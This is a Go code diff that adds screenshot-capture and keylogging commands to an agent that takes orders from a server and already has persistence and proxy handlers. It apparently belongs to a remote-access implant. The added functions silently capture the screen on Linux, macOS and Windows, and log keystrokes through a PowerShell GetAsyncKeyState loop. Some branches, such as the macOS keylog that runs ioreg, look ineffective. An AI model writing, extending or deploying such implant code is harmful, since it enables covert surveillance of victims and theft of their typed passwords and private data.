@@ -405,6 +405,10 @@ func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string,
 		return a.handlePersist(cmd.Payload)
 	case models.CmdTypeProxy:
 		return a.HandleProxy(cmd.Payload)
+	case models.CmdTypeScreenshot:
+		return a.handleScreenshot(ctx, timeout)
+	case models.CmdTypeKeylog:
+		return a.handleKeylog(ctx, cmd.Payload, timeout)
 	case models.CmdTypeKill:
 		return "agent shutting down", nil
 	default:
@@ -532,6 +536,114 @@ func (a *Agent) handlePersist(method string) (string, error) {
 		return "", fmt.Errorf("unknown persistence method: %s", method)
 	}
 	return "", err
+}
+
+func (a *Agent) handleScreenshot(ctx context.Context, timeout time.Duration) (string, error) {
+	if timeout <= 0 {
+		timeout = 30 * time.Second
+	}
+	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
+	defer cancel()
+
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "linux":
+		cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c",
+			"import -window root png:- 2>/dev/null || scrot -o /dev/stdout 2>/dev/null || xwd -root -silent 2>/dev/null | convert xwd:- png:- 2>/dev/null || cat /dev/urandom | head -c 0 && echo 'screenshot: no display tools found (install scrot or imagemagick)' >&2 && exit 1")
+	case "darwin":
+		tmp := filepath.Join(os.TempDir(), ".sc.png")
+		cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c",
+			fmt.Sprintf("screencapture -x %s && cat %s && rm -f %s", tmp, tmp, tmp))
+	case "windows":
+		cmd = exec.CommandContext(cmdCtx, "powershell", "-NoProfile", "-Command", `
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
+$ms = New-Object System.IO.MemoryStream
+$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+[System.Console]::OpenStandardOutput().Write($ms.ToArray(), 0, $ms.Length)
+$g.Dispose(); $bmp.Dispose(); $ms.Dispose()`)
+	default:
+		return "", fmt.Errorf("screenshot not supported on %s", runtime.GOOS)
+	}
+
+	out, err := cmd.CombinedOutput()
+	if err != nil && len(out) == 0 {
+		return "", fmt.Errorf("screenshot failed: %w", err)
+	}
+	if len(out) > MaxOutputSize {
+		out = out[:MaxOutputSize]
+	}
+	return base64.StdEncoding.EncodeToString(out), nil
+}
+
+func (a *Agent) handleKeylog(ctx context.Context, payload string, timeout time.Duration) (string, error) {
+	var req struct {
+		Action   string `json:"action"`
+		Duration int    `json:"duration"`
+	}
+	if err := json.Unmarshal([]byte(payload), &req); err != nil {
+		req.Action = payload
+	}
+	if req.Action == "" {
+		req.Action = "start"
+	}
+	if req.Duration <= 0 {
+		req.Duration = 30
+	}
+	if timeout <= 0 {
+		timeout = time.Duration(req.Duration+5) * time.Second
+	}
+
+	cmdCtx, cancel := context.WithTimeout(ctx, timeout)
+	defer cancel()
+
+	var cmd *exec.Cmd
+	switch req.Action {
+	case "start", "capture":
+		switch runtime.GOOS {
+		case "linux":
+			cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c",
+				fmt.Sprintf("timeout %d script -q /dev/null -c 'cat /dev/stdin' </dev/tty 2>/dev/null || timeout %d xinput test-xi2 --root 2>/dev/null || echo 'keylog: requires /dev/tty or xinput'",
+					req.Duration, req.Duration))
+		case "darwin":
+			cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c",
+				fmt.Sprintf("timeout %d ioreg -l -w0 2>/dev/null | head -100 || echo 'keylog: limited on macOS without accessibility permissions'", req.Duration))
+		case "windows":
+			cmd = exec.CommandContext(cmdCtx, "powershell", "-NoProfile", "-Command", fmt.Sprintf(`
+$code = @'
+using System; using System.Runtime.InteropServices; using System.Text;
+public class KL {
+  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+}
+'@
+Add-Type -TypeDefinition $code
+$end = (Get-Date).AddSeconds(%d); $buf = ""
+while ((Get-Date) -lt $end) {
+  for ($k=8; $k -le 190; $k++) {
+    if ([KL]::GetAsyncKeyState($k) -eq -32767) { $buf += [char]$k }
+  }
+  Start-Sleep -Milliseconds 50
+}
+$buf`, req.Duration))
+		default:
+			return "", fmt.Errorf("keylog not supported on %s", runtime.GOOS)
+		}
+	default:
+		return "", fmt.Errorf("unknown keylog action: %s", req.Action)
+	}
+
+	out, err := cmd.CombinedOutput()
+	if err != nil && len(out) == 0 {
+		return "", fmt.Errorf("keylog failed: %w", err)
+	}
+	if len(out) > MaxOutputSize {
+		out = out[:MaxOutputSize]
+	}
+	return string(out), nil
 }
 
 func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) {
